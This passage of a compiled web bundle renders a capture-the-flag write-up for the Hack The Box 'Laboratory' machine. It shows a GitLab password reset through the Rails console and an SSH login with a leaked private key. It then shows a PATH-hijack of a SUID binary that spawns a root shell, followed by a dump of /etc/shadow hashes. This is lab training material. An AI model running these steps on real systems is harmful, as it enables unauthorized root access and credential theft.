usernames:"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"https://git.laboratory.htb/seven"},"https://git.laboratory.htb/seven")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"https://git.laboratory.htb/dexter"},"https://git.laboratory.htb/dexter"))),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"dexter")," is most likely to have private repositories too, let's reset its password\nwith the Rails console:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ gitlab-rails console -e production\ndexter = User.where(username: 'dexter').first\ndexter.password = 'password'\ndexter.password_confirmation = 'password'\ndexter.save!\n")),(0,a.kt)("p",null,"We can log in the newly reset credentials and find a private project:\n",(0,a.kt)("a",{parentName:"p",href:"https://git.laboratory.htb/dexter/securedocker"},"https://git.laboratory.htb/dexter/securedocker")),(0,a.kt)("p",null,"A ssh key is saved: ",(0,a.kt)("a",{parentName:"p",href:"https://git.laboratory.htb/dexter/securedocker/-/blob/master/dexter/.ssh/id_rsa"},"https://git.laboratory.htb/dexter/securedocker/-/blob/master/dexter/.ssh/id_rsa")),(0,a.kt)("p",null,"Lets' connect with this key:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ chmod 600 id_rsa_root\n$ ssh dexter@10.10.10.216 -i id_rsa_root\ndexter@laboratory:~$ id\nuid=1000(dexter) gid=1000(dexter) groups=1000(dexter)\ndexter@laboratory:~$ cat user.txt\nc736ec0f5526877bde3f769e34e5b7dc\n")),(0,a.kt)("p",null,"We have know escaped the docker container adn are connected on the host."),(0,a.kt)("h2",{id:"privilege-escalation-of-machine--from-dexter-host-to-root-host"},"Privilege Escalation of Machine : from dexter (host) to root (host)"),(0,a.kt)("p",null,"Let's find SUID binaries and remove some uninteresting results:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"dexter@laboratory:~$ find / -perm -u=s -type f -exec ls -lh {} \\; 2>/dev/null | grep '/bin/' | grep -v '/snap/'\n-rwsr-xr-x 1 root dexter 17K Aug 28  2020 /usr/local/bin/docker-security\n-rwsr-xr-x 1 root root 163K Jan 19 14:21 /usr/bin/sudo\n-rwsr-xr-x 1 root root 44K May 28  2020 /usr/bin/newgrp\n-rwsr-xr-x 1 root root 67K Apr  2  2020 /usr/bin/su\n-rwsr-xr-x 1 root root 87K May 28  2020 /usr/bin/gpasswd\n-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount\n-rwsr-xr-x 1 root root 84K May 28  2020 /usr/bin/chfn\n-rwsr-xr-x 1 root root 31K Aug 16  2019 /usr/bin/pkexec\n-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at\n-rwsr-xr-x 1 root root 39K Apr  2  2020 /usr/bin/umount\n-rwsr-xr-x 1 root root 52K May 28  2020 /usr/bin/chsh\n-rwsr-xr-x 1 root root 55K Apr  2  2020 /usr/bin/mount\n-rwsr-xr-x 1 root root 67K May 28  2020 /usr/bin/passwd\n")),(0,a.kt)("p",null,"The unusual ",(0,a.kt)("inlineCode",{parentName:"p"},"/usr/local/bin/docker-security")," immediately trigger an alarm."),(0,a.kt)("p",null,"Looking at the binary we can find some strings:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"chmod 700 /usr/bin/docker\nchmod 660 /var/run/docker.sock\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"chmod")," is not called with an absolute path so we'll be able to abuse it."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"dexter@laboratory:~$ TF=$(mktemp -d)\ndexter@laboratory:~$ printf %s '/bin/bash -i' > $TF/chmod\ndexter@laboratory:~$ chmod +x $TF/chmod\ndexter@laboratory:~$ export PATH=$TF:$PATH\ndexter@laboratory:~$ /usr/local/bin/docker-security\nroot@laboratory:~# id\nuid=0(root) gid=0(root) groups=0(root),1000(dexter)\nroot@laboratory:~# cat /root/root.txt\nef0e8347aa9f24a62f03cafcdde43015\nroot@laboratory:~# grep '$6' /etc/shadow\nroot:$6$AMvgOmRCNzBloX3T$rd5nRPwkBPHenf6VLHfsXb066LNq0MZBRYeEsuCZviD8nQGvVLMaW9iH1hb5FPHzdl.McOJ8GrFIFfdSnIo4t1:18439:0:99999:7:::\ndexter:$6$eAUP4RwbH.7dC8vD$yt76SKVuEpKOgpp0D8r5YiYeB7edojKVHWoaNIDqk5JIvLD0t9n/jRL4v2FJH30s/ui2PymaXCKEvS38f2wKk1:18439:0:99999:7:::\n")))}u.isMDXComponent=!0},45753:(e,t,n)=>{n.d(t,{Z:()=>r});const r=n.p+"assets/images/laboratory-95e97f0d1d5e5382532765e4ced87547.png"}}]);